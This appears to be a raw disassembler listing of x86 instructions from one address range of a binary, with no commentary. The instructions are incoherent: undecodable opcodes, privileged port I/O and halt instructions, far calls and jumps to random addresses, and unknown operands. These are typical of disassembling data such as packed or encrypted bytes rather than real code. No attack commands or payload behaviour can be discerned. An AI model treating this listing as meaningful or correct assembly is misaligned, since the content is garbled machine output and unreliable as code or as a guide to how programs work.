  40bb04:	(bad)  
  40bb06:	test   eax,0x61f145c5
  40bb0b:	ins    BYTE PTR es:[edi],dx
  40bb0c:	mov    al,ds:0x1dc407f5
  40bb11:	(bad)  
  40bb12:	sub    DWORD PTR [esi-0x299f927f],eax
  40bb18:	and    al,0xf2
  40bb1a:	popf   
  40bb1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb1c:	push   edi
  40bb1d:	fs adc al,0xa4
  40bb20:	sub    edx,DWORD PTR [ecx+0x7a]
  40bb23:	ret    
  40bb24:	jle    0x40bb5c
  40bb26:	aam    0x23
  40bb28:	jmp    0x40bb1b
  40bb2a:	cmp    ebp,DWORD PTR [edi-0x1cb9cac8]
  40bb30:	(bad)  
  40bb32:	(bad)  
  40bb33:	jg     0x40bad6
  40bb35:	or     eax,0xd2607230
  40bb3a:	jo     0x40bb26
  40bb3c:	imul   edi,DWORD PTR [ecx],0x8267e676
  40bb42:	cmp    ebp,DWORD PTR [ecx-0x53]
  40bb45:	cld    
  40bb46:	mov    ah,0x22
  40bb48:	loop   0x40bb2f
  40bb4a:	leave  
  40bb4b:	add    ebp,DWORD PTR [edx]
  40bb4d:	cs jne 0x40bafc
  40bb50:	test   al,0x30
  40bb52:	aaa    
  40bb53:	or     BYTE PTR [edx-0x21],dl
  40bb56:	int    0x3
  40bb58:	pushf  
  40bb59:	jl     0x40bbc4
  40bb5b:	and    DWORD PTR [edx+0x6895bacd],ebx
  40bb61:	sub    ecx,DWORD PTR [edi+0x56]
  40bb64:	pusha  
  40bb65:	cli    
  40bb66:	push   ds
  40bb67:	push   0xffffff9b
  40bb69:	jnp    0x40bbb7
  40bb6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb6d:	stos   DWORD PTR es:[di],eax
  40bb6f:	cmp    BYTE PTR [ebx],cl
  40bb71:	and    BYTE PTR [edx-0x7a],dl
  40bb74:	cmc    
  40bb75:	jnp    0x40bbb3
  40bb77:	mov    ecx,0x6fa31542
  40bb7c:	jg     0x40bbb5
  40bb7e:	cmp    DWORD PTR [ecx+0x2],0xa45b73f2
  40bb85:	xor    eax,0xef12f521
  40bb8a:	rol    DWORD PTR [ecx+ebx*8+0x4a],0x7e
  40bb8f:	jbe    0x40bbac
  40bb91:	push   ebx
  40bb92:	loope  0x40bc0e
  40bb94:	sub    edx,ebx
  40bb96:	pop    ecx
  40bb97:	add    eax,0x3e139c0
  40bb9c:	sbb    BYTE PTR [ebp+esi*1-0x471a8ad8],cl
  40bba3:	mov    edi,0x6365887
  40bba8:	jecxz  0x40bbdf
  40bbaa:	into   
  40bbab:	push   0xb9cfa76a
  40bbb0:	sbb    DWORD PTR [ebx+0x257820a7],eax
  40bbb6:	jne    0x40bbf9
  40bbb8:	cld    
  40bbb9:	mov    al,BYTE PTR [edi+0x4]
  40bbbc:	sub    eax,0x402e2f3e
  40bbc1:	ins    BYTE PTR es:[edi],dx
  40bbc2:	dec    eax
  40bbc3:	sahf   
  40bbc4:	les    ebx,FWORD PTR [esi+0x6b]
  40bbc7:	cli    
  40bbc8:	imul   edi,edi,0x47d3dfdc
  40bbce:	mov    eax,DWORD PTR [ebx-0x53557596]
  40bbd4:	cmc    
  40bbd5:	add    dl,al
  40bbd7:	call   0xf161caff
  40bbdc:	dec    ebp
  40bbdd:	cs jmp 0x40bc0d
  40bbe0:	mov    eax,ds:0x40e2892c
  40bbe5:	stos   BYTE PTR es:[edi],al
  40bbe6:	imul   ecx,ecx,0xfffffff6
  40bbe9:	mov    esp,0x65892c78
  40bbee:	cwde   
  40bbef:	pushf  
  40bbf0:	push   es
  40bbf1:	call   0xa2d0:0xef883958
  40bbf8:	push   eax
  40bbf9:	call   0x1c48:0x665b5088
  40bc00:	pop    edx
  40bc01:	inc    edi
  40bc02:	mov    eax,ds:0x953ffaf5
  40bc07:	and    ecx,DWORD PTR [esi]
  40bc09:	push   esi
  40bc0a:	repnz adc DWORD PTR [ebp+0x55f55cc2],0x69dbd787
  40bc15:	xor    ecx,DWORD PTR [esi-0x75ad359a]
  40bc1b:	xchg   edx,eax
  40bc1c:	add    DWORD PTR [edi+0x64],ecx
  40bc1f:	xor    al,0xc6
  40bc21:	aaa    
  40bc22:	jmp    0x46f1:0xf408a0c3
  40bc29:	push   esp
  40bc2a:	aas    
  40bc2b:	arpl   WORD PTR [esi-0x33],dx
  40bc2e:	add    eax,0x7ed11ba9
  40bc33:	out    0x5f,eax
  40bc35:	dec    edx
  40bc36:	lock (bad) 
  40bc39:	les    eax,FWORD PTR [ecx]
  40bc3b:	cli    
  40bc3c:	icebp  
  40bc3d:	ret    
  40bc3e:	ins    BYTE PTR es:[edi],dx
  40bc3f:	pop    ebx
  40bc40:	cld    
  40bc41:	mov    WORD PTR [eax+0xce86a5c],ds
  40bc47:	push   ds
  40bc48:	sbb    eax,0x7df8bb8b
  40bc4d:	or     dl,al
  40bc4f:	jp     0x40bca5
  40bc51:	enter  0x4445,0xfd
  40bc55:	icebp  
  40bc56:	int    0x34
  40bc58:	pop    esi
  40bc59:	xchg   BYTE PTR [ebp+0x68f7efc5],ch
  40bc5f:	pop    ds
  40bc60:	xchg   bh,bh
  40bc62:	pop    ss
  40bc63:	fld    QWORD PTR [edi+0x6f4dc664]
  40bc69:	adc    al,0xc6
  40bc6b:	sbb    dh,BYTE PTR [esi]
  40bc6d:	call   0xbb83:0xc9bdbd3
  40bc74:	shr    BYTE PTR [ecx+0x79],1
  40bc77:	rcr    DWORD PTR [eax],cl
  40bc79:	bound  ecx,QWORD PTR [ebp+0x1d510a74]
  40bc7f:	iret   
  40bc80:	push   eax
  40bc81:	cli    
  40bc82:	xchg   edx,eax
  40bc83:	add    eax,0x2ad4f0b5
  40bc88:	mov    es,WORD PTR [eax]
  40bc8a:	adc    BYTE PTR [si],ch
  40bc8d:	pop    ecx
  40bc8e:	mov    ds,WORD PTR [ecx-0x35]
  40bc91:	dec    esi
  40bc92:	mov    es,edi
  40bc94:	cmp    dl,ah
  40bc96:	jmp    0x6c44751e
  40bc9b:	xchg   esp,eax
  40bc9c:	jg     0x40bcd3
  40bc9e:	xchg   ecx,eax
  40bc9f:	xchg   ecx,eax
  40bca0:	push   edx
  40bca1:	adc    eax,edi
  40bca3:	mov    bl,0xd2
  40bca5:	jne    0x40bd20
  40bca7:	test   eax,0xb6dda878
  40bcac:	or     al,0x90
  40bcae:	sar    esp,1
  40bcb0:	retf   0x30cd
  40bcb3:	cwde   
  40bcb4:	stc    
  40bcb5:	sbb    dh,ch
  40bcb7:	add    BYTE PTR [ebx+0x69],bl
  40bcba:	inc    ebp
  40bcbb:	inc    eax
  40bcbc:	pop    eax
  40bcbd:	int    0x4
  40bcbf:	int3   
  40bcc0:	lock fisubr WORD PTR [edx]
  40bcc3:	hlt    
  40bcc4:	test   BYTE PTR [edx],dh
  40bcc6:	mov    BYTE PTR [esi+0x4db2ac7b],0x64
  40bccd:	mul    DWORD PTR [edx+0x66d3b0c]
  40bcd3:	mov    ds:0x5009e6c0,eax
  40bcd8:	(bad)  
  40bcd9:	sub    DWORD PTR [edx-0x24],ebp
  40bcdc:	mov    al,ds:0x4fad24b
  40bce1:	outs   dx,BYTE PTR ds:[esi]
  40bce2:	in     eax,0x2e
  40bce4:	in     al,0x5b
  40bce6:	aam    0x29
  40bce8:	sbb    bl,BYTE PTR [eax+0x47]
  40bceb:	(bad)
  40bcee:	mov    bl,0x4
  40bcf0:	jg     0x40bc8f
  40bcf2:	pop    edx
  40bcf3:	into   
  40bcf4:	jg     0x40bc90
  40bcf6:	mov    ah,0x62
  40bcf8:	inc    ebx
  40bcf9:	add    al,0x8a
  40bcfb:	sub    eax,0x8ce31135
  40bd00:	cli    
  40bd01:	lock jp 0x40bca4
  40bd04:	leave  
  40bd05:	pop    edi
  40bd06:	sbb    DWORD PTR [ebx],0xa3b61207
  40bd0c:	inc    eax
  40bd0d:	sub    DWORD PTR [edi],esi
  40bd0f:	jl     0x40bd61
  40bd11:	int3   
  40bd12:	cld    
  40bd13:	ffree  st(4)
  40bd15:	(bad)  
  40bd16:	mov    ds:0x4f3905c4,al
  40bd1b:	mov    BYTE PTR [edx],dh
  40bd1d:	jmp    0xfbb2b720
  40bd22:	fwait
  40bd23:	aad    0x81
  40bd25:	jns    0x40bcfe
  40bd27:	sub    edx,DWORD PTR [esi-0x7c]
  40bd2a:	and    DWORD PTR [ecx+ebx*1],0x60df166d
  40bd31:	out    dx,eax
  40bd32:	xchg   BYTE PTR [edx],cl
  40bd34:	loope  0x40bd91
  40bd36:	stos   BYTE PTR es:[edi],al
  40bd37:	jno    0x40bd21
  40bd39:	sub    bl,BYTE PTR [eax+esi*1]
  40bd3c:	test   BYTE PTR [ebx+0x67189c21],dh
  40bd42:	push   es
  40bd43:	shl    BYTE PTR [esi+0x5f527b73],1
  40bd49:	in     eax,0x78
  40bd4b:	xchg   ecx,eax
  40bd4c:	sbb    DWORD PTR [ecx+0x4830bed2],esi
  40bd52:	in     eax,dx
  40bd53:	cmp    esp,DWORD PTR [edi+0x3c]
  40bd56:	and    eax,0x3d9e476c
  40bd5b:	pop    eax
  40bd5c:	aad    0x96
  40bd5e:	cmp    ch,BYTE PTR [edx-0x5]
  40bd61:	xchg   edx,eax
  40bd62:	jecxz  0x40bd0e
  40bd64:	loopne 0x40bd22
  40bd66:	cmp    ebp,DWORD PTR [ebp-0x1f]
  40bd69:	popf   
  40bd6a:	mov    ds:0xad926ae6,al
  40bd6f:	adc    bl,BYTE PTR es:[edi]
  40bd72:	addr16 aas 
  40bd74:	dec    ebp
  40bd75:	icebp  
  40bd76:	add    dl,BYTE PTR ds:0x70cb19ca
  40bd7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd7d:	aaa    
  40bd7e:	inc    ebx
  40bd7f:	ds pushf 
  40bd81:	daa    
  40bd82:	add    bh,ah
  40bd84:	add    al,0x6e
  40bd86:	inc    esp
  40bd87:	xchg   esi,eax
  40bd88:	jl     0x40bd2b
  40bd8a:	aaa    
  40bd8b:	imul   esi,ecx,0x446cdefc
  40bd91:	and    al,0xff
  40bd93:	inc    ebx
  40bd94:	mov    WORD PTR [ecx],gs
  40bd96:	push   es
  40bd97:	pop    DWORD PTR [ebx-0x3]
  40bd9a:	std    
  40bd9b:	hlt    
  40bd9c:	push   0xd8be62d1
  40bda1:	and    DWORD PTR [ebp+0xd472b0f],edi
  40bda7:	lock jg 0x40be1a
  40bdaa:	retf   0xe1cd
  40bdad:	jl     0x40bde7
  40bdaf:	shl    DWORD PTR [ecx+esi*1-0x393bc3d5],cl
  40bdb6:	ja     0x40be1e
  40bdb8:	lds    edi,FWORD PTR [ebx]
  40bdba:	sbb    DWORD PTR [edi],ebp
  40bdbc:	into   
  40bdbd:	sbb    BYTE PTR [edx+ebx*8+0x78a3161d],bh
  40bdc4:	push   cs
  40bdc5:	mov    dl,0x99
  40bdc7:	xchg   BYTE PTR [esi+eax*2-0x41],bl
  40bdcb:	hlt    
  40bdcc:	(bad)  
  40bdcd:	lea    eax,[edx-0x48e3646b]
  40bdd3:	and    bl,BYTE PTR [ebp-0x9]
  40bdd6:	adc    BYTE PTR [edx-0x2b],bh
  40bdd9:	hlt    
  40bdda:	mov    esp,0xb8eab28e
  40bddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bde0:	xor    ch,BYTE PTR [edi]
  40bde2:	or     eax,0x9ebf476b
  40bde7:	push   ss
  40bde8:	(bad)
  40bdeb:	sbb    BYTE PTR [esi+0x22],cl
  40bdee:	dec    edx
  40bdef:	push   esp
  40bdf0:	inc    ebp
  40bdf1:	mov    edi,0x46d24d1d
  40bdf6:	les    esp,FWORD PTR [ebp-0x75]
  40bdf9:	mov    esi,DWORD PTR ds:0xe7f5ec63
  40bdff:	aad    0x1e
  40be01:	test   al,0x6a
  40be03:	les    esi,FWORD PTR [edx+0x4]
  40be06:	imul   esi,ebx,0xffffffbd
  40be09:	fs enter 0xd882,0x21
  40be0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be0f:	sub    al,ah
  40be11:	adc    dl,BYTE PTR [eax-0x6]
  40be14:	pop    edx
  40be15:	jno    0x40be73
  40be17:	inc    edx
  40be18:	int3   
  40be19:	dec    ecx
  40be1a:	push   ebx
  40be1b:	(bad)  [esi-0x25151682]
  40be21:	push   ss
  40be22:	std    
  40be23:	pop    ss
  40be24:	xor    cl,al
  40be26:	and    BYTE PTR [eax+0x36],ah
  40be29:	mov    ch,0x4d
  40be2b:	lock ja 0x40be3f
  40be2e:	xor    al,0xbf
  40be30:	and    dh,BYTE PTR [ecx+0x26b5c628]
  40be36:	inc    DWORD PTR [ecx+0x4fa4b40c]
  40be3c:	imul   esi,esp,0xffffff8b
  40be3f:	cmc    
  40be40:	mov    bh,0xb6
  40be42:	int3   
  40be43:	int    0xb1
  40be45:	shl    ebp,cl
  40be47:	add    DWORD PTR [esi+eiz*8],esi
  40be4a:	jmp    DWORD PTR [esi+0xf961fa2]
  40be50:	(bad)  
  40be51:	stc    
  40be52:	addr16 stc 
  40be54:	xor    DWORD PTR ds:0xd5af09c1,0xffffffe3
  40be5b:	jns    0x40beb3
  40be5d:	lods   al,BYTE PTR ds:[esi]
  40be5e:	outs   dx,BYTE PTR ds:[esi]
  40be5f:	or     DWORD PTR [esi],0xf
  40be62:	cmp    edx,DWORD PTR [ebp-0x1fd5821d]
  40be68:	mov    ebx,0xe8e7b46d
  40be6d:	retf   0xed76
  40be70:	inc    DWORD PTR [esi]
  40be72:	je     0x40beda
  40be74:	test   al,0x39
  40be76:	xor    dh,0x7e
  40be79:	test   DWORD PTR ds:0xbd8b421c,0x4ef34b8a
  40be83:	sbb    eax,0x3dac425d
  40be88:	or     ecx,ebp
  40be8a:	ds inc esp
  40be8c:	inc    ecx
  40be8d:	jp     0x40be20
  40be8f:	cmc    
  40be90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be91:	sub    eax,0xd05f479f
  40be96:	sub    DWORD PTR [ecx-0x3f7d5a2f],edi
  40be9c:	jg     0x40be86
  40be9e:	cld    
  40be9f:	jns    0x40bf12
  40bea1:	pminub mm6,mm1
  40bea4:	jge    0x40bec2
  40bea6:	mov    cl,0xea
  40bea8:	xchg   bl,bh
  40beaa:	les    ebx,FWORD PTR [ebx-0x3622119a]
  40beb0:	adc    eax,0x756e941a
  40beb5:	aaa    
  40beb6:	jb     0x40bf33
  40beb8:	mov    ah,0x8c
  40beba:	inc    eax
  40bebb:	sbb    BYTE PTR [ecx+ebx*4+0x14faebfd],al
  40bec2:	ss jle 0x40bec0
  40bec5:	dec    esi
  40bec6:	push   ds
  40bec7:	loop   0x40bf1c
  40bec9:	sahf   
  40beca:	mov    ah,0x11
  40becc:	shl    al,1
  40bece:	mov    edx,0x10eb9523
  40bed3:	dec    ebx
  40bed4:	push   esp
  40bed5:	sub    ebx,DWORD PTR [ecx]
  40bed7:	enter  0xf394,0xc2
  40bedb:	inc    esi
  40bedc:	data16 jae 0x40bf2d
  40bedf:	fs inc esi
  40bee1:	and    al,0xc0
  40bee3:	mov    WORD PTR [ecx+0x59a69e72],ds
  40bee9:	pop    ecx
  40beea:	dec    ebp
  40beeb:	push   ss
  40beec:	rcl    al,0x33
  40beef:	test   DWORD PTR [edi],ebx
  40bef1:	fs adc al,0x3e
  40bef4:	(bad)  
  40bef5:	adc    bl,ch
  40bef7:	mov    bl,BYTE PTR [edx+0x58923216]
  40befd:	xlat   BYTE PTR ds:[ebx]
  40befe:	outs   dx,DWORD PTR ds:[esi]
  40beff:	jecxz  0x40be90
  40bf01:	stos   BYTE PTR es:[edi],al
  40bf02:	scas   al,BYTE PTR es:[edi]
  40bf03:	xor    al,0x4
  40bf05:	jo     0x40beab
  40bf07:	push   ebx
  40bf08:	ja     0x40bf5b
  40bf0a:	imul   esp,ecx,0x68
  40bf0d:	imul   edi,DWORD PTR [edi],0xbbe1fca6
  40bf13:	mov    al,ds:0xb4b30c31
  40bf18:	xchg   edi,eax
  40bf19:	push   ebx
  40bf1a:	add    DWORD PTR [ebp+0x775933b2],ebp
  40bf20:	jge    0x40bed1
  40bf22:	fimul  WORD PTR [edi+0x74d8c8b9]
  40bf28:	jl     0x40bf26
  40bf2a:	xor    cl,BYTE PTR [esi-0x37f95e60]
  40bf30:	add    cl,BYTE PTR [ecx-0x41]
  40bf33:	add    BYTE PTR [eax],al
  40bf35:	test   DWORD PTR [edx+0x332f3bc],esi
  40bf3b:	fwait
  40bf3c:	out    dx,eax
  40bf3d:	ficom  WORD PTR [ebx]
  40bf3f:	jns    0x40bf16
  40bf41:	nop
  40bf42:	and    eax,0x7a7139b6
  40bf47:	jge    0x40bfa4
  40bf49:	sar    BYTE PTR [edx+eax*4],1
  40bf4c:	enter  0xad5e,0x8
  40bf50:	pop    ecx
  40bf51:	(bad)  
  40bf52:	sbb    dl,BYTE PTR [eax]
  40bf54:	rol    BYTE PTR [eax-0x4d],0x97
  40bf58:	pop    ss
  40bf59:	cs pop es
  40bf5b:	sbb    BYTE PTR [edx-0x55dedb7f],ah
  40bf61:	push   ebx
  40bf62:	out    0x96,al
  40bf64:	call   0xd1f2a439
  40bf69:	cmp    bh,bl
  40bf6b:	and    eax,0x774c9e07
  40bf70:	sbb    DWORD PTR [eax+0x5e8ebe51],eax
  40bf76:	push   0x39797780
  40bf7b:	mov    ebx,0x3394bcce
  40bf80:	push   edi
  40bf81:	test   eax,0x55696203
  40bf86:	mov    dl,0xe
  40bf88:	pushf  
  40bf89:	inc    ecx
  40bf8a:	repnz and ch,BYTE PTR [esi+edi*1]
  40bf8e:	nop
  40bf8f:	ss inc ebp
  40bf91:	xchg   esp,eax
  40bf92:	cs std 
  40bf94:	aam    0xdc
  40bf96:	ss push 0x43
  40bf99:	inc    ecx
  40bf9a:	lods   al,BYTE PTR es:[esi]
  40bf9c:	and    eax,0x39e6bbd4
  40bfa1:	nop
  40bfa2:	mov    ?,WORD PTR [ecx-0x45f5c725]
  40bfa8:	dec    ebx
  40bfa9:	inc    ebp
  40bfaa:	scas   eax,DWORD PTR es:[edi]
  40bfab:	lea    edi,[edi]
  40bfad:	or     eax,0x37984595
  40bfb2:	xor    eax,0x69dafa1e
  40bfb7:	sub    DWORD PTR [esi-0x4a],edi
  40bfba:	and    al,0x68
  40bfbc:	das    
  40bfbd:	shl    BYTE PTR [eax+0x34],0x35
  40bfc1:	or     BYTE PTR [eax],ch
  40bfc3:	jge    0x40bfdf
  40bfc5:	mov    cl,0x61
  40bfc7:	push   es
  40bfc8:	add    DWORD PTR [ecx],esi
  40bfca:	mov    esi,0x49a7d9ab
  40bfcf:	jmp    0x79bd108d
  40bfd4:	gs or  esp,ecx
  40bfd7:	and    esi,ecx
  40bfd9:	jb     0x40bf62
  40bfdb:	cmp    eax,edx
  40bfdd:	stc    
  40bfde:	call   DWORD PTR [esi+0xe0d5e38]
  40bfe4:	sub    bl,cl
  40bfe6:	lock jmp 0x1aa8abdc
  40bfec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfed:	js     0x40c059
  40bfef:	mov    ebx,0xb17151ef
  40bff4:	jl     0x40c06b
  40bff6:	adc    al,0x7
  40bff8:	xchg   ebx,eax
  40bff9:	jmp    0x393e674
  40bffe:	retf   
  40bfff:	in     eax,0xde
  40c001:	shl    BYTE PTR [esi+0x1da42aaf],cl
  40c007:	xchg   esi,eax
  40c008:	inc    ebp
  40c009:	repnz push ecx
  40c00b:	test   ch,dh
  40c00d:	sub    al,0x46
  40c00f:	mov    ah,0x53
  40c011:	aaa    
  40c012:	mov    ah,0xc6
  40c014:	imul   esi,DWORD PTR [esi+ebx*2+0x1f],0x5b939d39
  40c01c:	or     BYTE PTR [ecx],dl
  40c01e:	fistp  WORD PTR [eax+eiz*1+0x51]
  40c022:	or     eax,DWORD PTR [ebp+0x9]
  40c025:	test   ch,0x4
  40c028:	mov    eax,ds:0xf19524d0
  40c02d:	inc    esp
  40c02e:	jp     0x40bfce
  40c030:	jp     0x40bfee
  40c032:	xchg   esi,eax
  40c033:	fcompp 
  40c035:	dec    ebp
  40c036:	dec    ebx
  40c037:	or     esi,DWORD PTR [edi-0x29b0483a]
  40c03d:	pop    es
  40c03e:	adc    DWORD PTR [esi-0x53],ebx
  40c041:	shr    BYTE PTR [eax-0x3c],1
  40c044:	and    dl,dl
  40c046:	cmp    ebx,DWORD PTR [edx+0x69]
  40c049:	out    dx,eax
  40c04a:	fld    DWORD PTR [edx]
  40c04c:	push   edi
  40c04d:	(bad)  
  40c04e:	ins    BYTE PTR es:[edi],dx
  40c04f:	pop    esi
  40c050:	jmp    0x40c0b8
  40c052:	rol    esi,1
  40c054:	int3   
  40c055:	cmp    ah,BYTE PTR [bx+di+0x46]
  40c059:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c05a:	xchg   ebx,eax
  40c05b:	ss call 0x7ca9:0x88d67960
  40c063:	retf   0x613a
  40c066:	cld    
  40c067:	imul   ebp,DWORD PTR [ebx+ebp*4],0xc5d4b289
  40c06e:	jp     0x40c0eb
  40c070:	(bad)  
  40c071:	js     0x40c01d
  40c073:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40c075:	out    dx,al
  40c076:	dec    ebp
  40c077:	shl    bl,1
  40c079:	adc    al,0x50
  40c07b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c07c:	loope  0x40c099
  40c07e:	mov    dl,0xf8
  40c080:	or     esi,edi
  40c082:	jmp    0x40c085
  40c084:	jbe    0x40c025
  40c086:	jnp    0x40c01b
  40c088:	(bad)  
  40c089:	dec    edx
  40c08a:	sbb    eax,0x18e0cf2f
  40c08f:	or     edi,DWORD PTR [eax]
  40c091:	je     0x40c0e6
  40c093:	mov    ch,BYTE PTR [edx]
  40c095:	addr16 aam 0xea
  40c098:	mov    WORD PTR ds:0x4e20d51b,ss
  40c09e:	mov    ds:0xdec2687,eax
  40c0a3:	mov    eax,0x775b0402
  40c0a8:	push   ds
  40c0a9:	push   ecx
  40c0aa:	adc    ebp,DWORD PTR [edi]
  40c0ac:	mov    ebx,0xa25d8eb1
  40c0b1:	sbb    eax,0xe38933ef
  40c0b6:	retf   0xd494
  40c0b9:	aas    
  40c0ba:	out    0xc2,al
  40c0bc:	cmp    ecx,DWORD PTR [esi]
  40c0be:	cmp    DWORD PTR [ebp+0x6e21669f],edx
  40c0c4:	jne    0x40c0c2
  40c0c6:	push   edx
  40c0c7:	cwde   
  40c0c8:	cmp    al,0x2b
  40c0ca:	add    BYTE PTR [edi+0x23c23ffb],cl
  40c0d0:	mov    DWORD PTR [ebp-0x73],edx
  40c0d3:	das    
  40c0d4:	cmp    dl,BYTE PTR [edx]
  40c0d6:	dec    esp
  40c0d7:	sbb    al,0xcc
  40c0d9:	xchg   edi,eax
  40c0da:	push   ecx
  40c0db:	das    
  40c0dc:	inc    ecx
  40c0dd:	sar    DWORD PTR [edi+ebp*1],0xf4
  40c0e1:	nop
  40c0e2:	and    al,0x59
  40c0e4:	dec    ebp
  40c0e5:	out    dx,eax
  40c0e6:	xchg   esi,eax
  40c0e7:	scas   al,BYTE PTR es:[edi]
  40c0e8:	fcom   DWORD PTR [edi]
  40c0ea:	pusha  
  40c0eb:	test   DWORD PTR [eax],edx
  40c0ed:	mov    ebx,0xa7edc161
  40c0f2:	mov    cl,0x0
  40c0f4:	inc    edi
  40c0f5:	jl     0x40c0b6
  40c0f7:	dec    ebx
  40c0f8:	shr    BYTE PTR [ecx-0x14faaf3e],0xa0
  40c0ff:	mov    esp,?
  40c101:	fisub  WORD PTR ds:0xb9a145c3
  40c107:	outs   dx,BYTE PTR ds:[esi]
  40c108:	or     BYTE PTR [ebx],cl
  40c10a:	(bad)  
  40c10c:	test   al,0xf8
  40c10e:	pop    ds
  40c10f:	add    al,0x1f
  40c111:	pop    esi
  40c112:	shl    BYTE PTR [bp+si],1
  40c115:	mov    BYTE PTR [esi+0x7c9d9b1c],dh
  40c11b:	xor    BYTE PTR [ecx+esi*4-0x55],0x56
  40c120:	stc    
  40c121:	dec    ebx
  40c122:	mov    ah,0xe
  40c124:	xor    al,0x1a
  40c126:	sbb    al,0x3c
  40c128:	test   al,0xb3
  40c12a:	inc    edx
  40c12b:	adc    dh,al
  40c12d:	adc    bl,BYTE PTR [ebx+0x26]
  40c130:	ins    DWORD PTR es:[edi],dx
  40c131:	xor    al,0x14
  40c133:	xchg   DWORD PTR [eax-0x4f],ebp
  40c136:	sub    eax,0xe1479f4
  40c13b:	jmp    0xa753:0xa09a13e0
  40c142:	sahf   
  40c143:	lods   eax,DWORD PTR ds:[esi]
  40c144:	push   esi
  40c145:	mov    ds,edx
  40c147:	sbb    ah,dl
  40c149:	test   eax,0xf0009f5
  40c14e:	ins    DWORD PTR es:[edi],dx
  40c14f:	mov    fs,WORD PTR [esi]
  40c151:	ret    0xdbd1
  40c154:	dec    esi
  40c155:	outs   dx,DWORD PTR ds:[esi]
  40c156:	pop    es
  40c157:	push   0x4c5e891d
  40c15c:	out    0xf7,al
  40c15e:	push   edi
  40c15f:	jb     0x40c186
  40c161:	out    0x28,al
  40c163:	sub    eax,0x1ecf74f
  40c168:	cmp    al,0xf6
  40c16a:	xor    eax,0x90b5f535
  40c16f:	ins    BYTE PTR es:[edi],dx
  40c170:	xor    ebx,DWORD PTR [eax-0x718e57ed]
  40c176:	repz mov al,0xf5
  40c179:	das    
  40c17a:	jns    0x40c1b2
  40c17c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c17d:	pop    eax
  40c17e:	lds    edi,FWORD PTR [edi+0x75]
  40c181:	ds inc ecx
  40c183:	pop    ss
  40c184:	or     DWORD PTR [eax-0x19],esp
  40c187:	inc    esp
  40c188:	dec    esp
  40c189:	mov    esi,0xd6b2978d
  40c18e:	xchg   ebx,eax
  40c18f:	mov    al,0xcd
  40c191:	cmp    ch,BYTE PTR [ebx]
  40c193:	add    BYTE PTR [ebp+0x25d98812],0x9a
  40c19a:	dec    eax
  40c19b:	not    BYTE PTR [edi-0x617b7f82]
  40c1a1:	ins    DWORD PTR es:[edi],dx
  40c1a2:	into   
  40c1a3:	dec    ebx
  40c1a4:	push   esi
  40c1a5:	leave  
  40c1a6:	bound  ebp,QWORD PTR [edx-0x76f8ce18]
  40c1ac:	ja     0x40c179
  40c1ae:	cmc    
  40c1af:	push   esp
  40c1b0:	(bad)
  40c1b3:	add    DWORD PTR [eax+0x6848abd1],eax
  40c1b9:	outs   dx,DWORD PTR ds:[esi]
  40c1ba:	ins    DWORD PTR es:[edi],dx
  40c1bb:	retf   0x86d6
  40c1be:	cli    
  40c1bf:	scas   eax,DWORD PTR es:[edi]
  40c1c0:	es aas 
  40c1c2:	jg     0x40c19d
  40c1c4:	shr    al,1
  40c1c6:	push   ss
  40c1c7:	(bad)  
  40c1c8:	jle    0x40c20f
  40c1ca:	jbe    0x40c1dc
  40c1cc:	cli    
  40c1cd:	push   ss
  40c1ce:	scas   al,BYTE PTR es:[edi]
  40c1cf:	or     eax,0x79b4b670
  40c1d4:	mov    eax,DWORD PTR fs:[ecx+0x7c7ab1e4]
  40c1db:	fucomp st(6)
  40c1dd:	jmp    0xffa0a5ad
  40c1e2:	jbe    0x40c1d4
  40c1e4:	std    
  40c1e5:	pop    esi
  40c1e6:	adc    bh,BYTE PTR [edi]
  40c1e8:	gs ja  0x40c19f
  40c1eb:	or     edi,DWORD PTR [esp-0x50b88fb9]
  40c1f2:	sahf   
  40c1f3:	jl     0x40c221
  40c1f5:	aam    0x52
  40c1f7:	leave  
  40c1f8:	in     al,0xc
  40c1fa:	int    0xd4
  40c1fc:	test   al,0x7e
  40c1fe:	fisub  WORD PTR [ecx]
  40c200:	sub    bl,BYTE PTR [edx+edi*4]
  40c203:	pop    ds
  40c204:	push   es
  40c205:	sbb    eax,0x556dd7c0
  40c20a:	push   ss
  40c20b:	xchg   ebp,eax
  40c20c:	in     eax,dx
  40c20d:	jmp    0x962aef0a
  40c212:	push   esp
  40c213:	xchg   ebp,eax
  40c214:	sbb    al,BYTE PTR [esi-0x616c014]
  40c21a:	cld    
  40c21b:	inc    edx
  40c21c:	add    bh,ch
  40c21e:	mov    ds:0x9f6536db,al
  40c223:	scas   eax,DWORD PTR es:[edi]
  40c224:	add    bl,0x6a
  40c227:	data16 stos BYTE PTR es:[edi],al
  40c229:	cdq    
  40c22a:	cmp    DWORD PTR [esi-0x6f3271b9],eax
  40c230:	add    DWORD PTR [esi+ebx*1-0x5b7a2de4],edi
  40c237:	xor    cl,BYTE PTR [eax]
  40c239:	in     eax,0x3c
  40c23b:	pop    esp
  40c23c:	cld    
  40c23d:	gs je  0x40c246
  40c240:	ds cdq 
  40c242:	repz dec ecx
  40c244:	mov    ecx,0x9916b80f
  40c249:	sbb    cl,BYTE PTR [ebx]
  40c24b:	loopne 0x40c2a2
  40c24d:	clc    
  40c24e:	and    al,0x3d
  40c250:	jl     0x40c227
  40c252:	cmp    DWORD PTR [edx-0x18],ebx
  40c255:	xchg   edx,eax
  40c256:	cmp    al,0x8a
  40c258:	xchg   BYTE PTR [ecx+edx*8],cl
  40c25b:	enter  0x8eec,0x4b
  40c25f:	xlat   BYTE PTR ds:[ebx]
  40c260:	out    dx,eax
  40c261:	mov    esp,0x6e070a85
  40c266:	clc    
  40c267:	push   es
  40c268:	inc    esp
  40c269:	push   es
  40c26a:	push   ebp
  40c26b:	fadd   QWORD PTR [esi-0x258483ad]
  40c271:	mov    ebp,0x3499c0f2
  40c276:	mov    ch,0xe4
  40c278:	mov    ch,0x3b
